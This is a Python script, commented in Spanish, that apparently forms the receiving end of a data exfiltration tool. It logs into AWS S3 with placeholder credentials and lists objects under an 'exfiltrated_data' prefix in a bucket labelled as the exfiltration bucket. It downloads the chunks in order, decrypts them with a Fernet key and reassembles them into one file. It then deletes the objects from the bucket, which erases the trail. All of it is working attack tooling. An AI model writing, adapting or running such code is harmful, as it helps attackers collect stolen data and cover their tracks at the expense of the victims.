import boto3
import sys
import json
import os
import math
from cryptography.fernet import Fernet
key = b'<FERNET_KEY>'

#----------Reset del entorno (Borramos archivos anteriores, etc--------------
if os.path.exists("reconstructedFile.txt"):
	os.remove("reconstructedFile.txt")

if not os.path.exists("downloadedFiles/"):
	os.makedirs("downloadedFiles/")

folder = 'downloadedFiles'
for file in os.listdir(folder):
	file_path = os.path.join(folder, file)
	if os.path.isfile(file_path):
		os.unlink(file_path)

#----------Conexion a aws--------------
session = boto3.session.Session(aws_access_key_id = '<AWS_ACCESS_KEY_ID>',
 								aws_secret_access_key = '<AWS_SECRET_ACCESS_KEY_ID>',
 								region_name = 'us-east-2')
aws_s3_client = session.client('s3')
aws_s3_resource = session.resource('s3')

#----------Obtenemos todos los nombres de los archivos en nuestro bucket--------------
list_response = aws_s3_client.list_objects(
	Bucket = '<EXFILTRATION_BUCKET_NAME>',
	Delimiter = '/exfiltrated_data'
)
list_response_contents = list_response['Contents']
fileNames = []
for content in list_response_contents:
	name = content['Key'].replace('.txt','')
	if sys.argv[1] in name and sys.argv[2] in name:
		fileNames.append(name)

print(fileNames)
#----------Quitamos .txt para poder hacer sort por las dudas, lo agregamos de nuevo--------------
fileNames.sort(key = lambda x: int(x.split('.')[-1]))
for i in range(len(fileNames)):
	fileNames[i] = fileNames[i] + '.txt'

#----------El download solo transfiere, por lo que los archivos ya tienen que existir----------
for file in fileNames:
	name = file.replace('exfiltrated_data/','')
	print(name)
	file = open('downloadedFiles/'+name , "w+")
	file.close()

#----------Descargamos los archivos desde el bucket--------------
for file in fileNames:
	print(file)
	name = file.replace('exfiltrated_data/','')
	aws_s3_resource.meta.client.download_file('<EXFILTRATION_BUCKET_NAME>', file, 'downloadedFiles/'+name)

#----------Cramos un archivo nuevo de reconstruccion--------------
with open('reconstructedFile.txt', 'a+') as finalFile:
	for file in fileNames:

		#----------Abrimos y leemos archivo--------------
		name = file.replace('exfiltrated_data/','')
		file = open('downloadedFiles/'+name , "r")
		data = file.read()
		data_bytes = data.encode()

		#----------Decode de la info--------------
		f = Fernet(key)
		data_decrypt = f.decrypt(data_bytes)

		#----------Ponemos info dentro de reconstruccion--------------
		finalFile.write(data_decrypt.decode().replace('\r',''))

		file.close()

#----------Borramos toda la informacion del bucket--------------
bucket = aws_s3_resource.Bucket('<EXFILTRATION_BUCKET_NAME>')
for file in fileNames:
	aws_s3_resource.Object('<EXFILTRATION_BUCKET_NAME>', file).delete()